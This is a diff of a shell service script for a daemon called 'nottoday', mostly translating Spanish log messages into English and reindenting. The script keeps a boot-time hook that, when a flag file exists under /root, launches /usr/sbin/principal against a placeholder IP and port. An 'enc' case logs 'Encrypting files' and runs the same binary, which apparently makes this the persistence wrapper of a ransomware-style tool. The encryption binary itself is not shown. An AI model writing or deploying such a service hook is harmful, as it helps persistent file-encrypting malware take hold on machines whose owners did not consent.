@@ -12,30 +12,30 @@
 
 LOG_FILE="/var/log/nottoday.log"
 
-echo "$(date): corrio nuestro daemon" >> $LOG_FILE
+echo "$(date): running" >> $LOG_FILE
 
 case $1 in
     start|restart|force-reload)
-        echo "$(date): corrio $1" >> $LOG_FILE
+        echo "$(date): $1 requested" >> $LOG_FILE
 
-	if [ -f /root/flag.ntd ];then
-		/usr/sbin/principal [IP] [PORT]
-	fi
+        if [ -f /root/flag.ntd ];then
+            /usr/sbin/principal [IP] [PORT]
+        fi
 	;;
     stop)
-	echo "$(date): se detuvo" >> $LOG_FILE
-        ;;
+	    echo "$(date): stopped requested. Nothing was done yet" >> $LOG_FILE
+    ;;
     enc)
-	echo "$(date): cifrando" >> $LOG_FILE
+        echo "$(date): incident. Encrypting files" >> $LOG_FILE
         /usr/sbin/principal [IP] [PORT]
 	;;
     status)
-	echo "$(date): se analizo el estado" >> $LOG_FILE
+	    echo "$(date): status requested" >> $LOG_FILE
         exit 0
-        ;;
+    ;;
     *)
         echo "Usage: $0 {start|stop|status|restart|force-reload}" >&2
         exit 3
-        ;;
+    ;;
 
 esac
